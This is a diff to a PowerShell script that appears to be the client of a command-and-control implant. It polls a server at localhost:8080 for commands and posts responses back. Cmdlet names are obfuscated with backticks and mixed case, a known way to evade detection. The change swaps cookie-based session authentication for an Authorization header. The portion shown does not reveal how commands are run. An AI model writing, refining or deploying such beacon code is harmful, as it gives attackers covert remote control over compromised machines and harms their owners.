@@ -1,13 +1,8 @@
 $session = nEW`-oBj`ECt Microsoft.PowerShell.Commands.WebRequestSession
-$cookie = nEW`-oBj`ECt System.Net.Cookie     
-$cookie.Name = "id"
-$cookie.Value = "2"
-$cookie.Domain = "localhost"
-$session.Cookies.Add($cookie);
 $sleep_time = 1
 function get_command {
 
-    $req = Invoke-WebRequest "http://localhost:8080/getcommand/asd" -WebSession $session 
+    $req = Invoke-WebRequest "http://localhost:8080/getcommand/asd" -Headers @{"Authorization"="1"} 
     return $req.Content 
 }
 
@@ -19,7 +14,7 @@ function post_response([string]$command){
     
 
     $postParams = @{rfile=$command}
-    $req = Invoke-WebRequest "http://localhost:8080/response/mskd" -WebSession $session -Method POST -Body $postParams 
+    $req = Invoke-WebRequest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="1"}  -Method POST -Body $postParams 
 }
 
 $var = 1
